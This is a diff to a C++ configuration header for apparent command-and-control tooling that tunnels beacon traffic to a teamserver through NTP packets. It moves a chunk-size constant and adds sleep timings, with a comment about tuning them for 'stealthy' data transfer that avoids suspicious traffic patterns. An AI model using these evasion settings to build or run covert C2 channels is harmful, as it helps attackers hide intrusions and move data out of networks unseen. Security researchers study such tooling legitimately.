@@ -50,13 +50,6 @@ Extension Field layout. This comes after the 48 byte NTP packet
 
 }
 
-namespace Chunk {
-    //How much data on top of the NTP packet, and it's 8 byte of headers, you want to send. Can be up to 65535 total, otherwise server starts to lose data. 
-    //Smaller = more packets, bigger = less packets. Advised to keep below normal MTU of 1500 (which would be 1500-48-8, or 1452) to prevent ip fragmentation 
-    constexpr int maxChunkSize = 1016;
-
-}
-//
 namespace Controller { 
     //!! This is NOT the teamserver address. This is for pointing our packets at the NTP server (of which talks to the teamserver)
 
@@ -68,6 +61,19 @@ namespace Controller {
 
 namespace Client {
     const std::vector<uint8_t> emptyClientId = { 0xFF, 0xFF, 0xFF, 0xFF }; //const cuz this shuold never change
+    const int packetSleepTimeMs = 100; //how long to sleep between sending packets, in MS. 
+    const int beaconSleepTimeMs = 10000; //how long to sleep after one loop of communicating with the beacon.
+
+    //How much data on top of the NTP packet, and it's 8 byte of headers, you want to send. Can be up to 65535 total, otherwise server starts to lose data. 
+    //Smaller = more packets, bigger = less packets. Advised to keep below normal MTU of 1500 (which would be 1500-48-8, or 1452) to prevent ip fragmentation 
+    constexpr int maxChunkSize = 1016;
+
+    /*
+    Strategy: Find a good balance between packet sleep time, beacon sleep time, and chunks size, for efficent yet stealthy data transfer. 
+
+    It's gonna look really weird if you read from a pipe, and send an NTP packet that's massive every 10 milliseconds
+    
+    */
 }
 
 namespace Beacon {
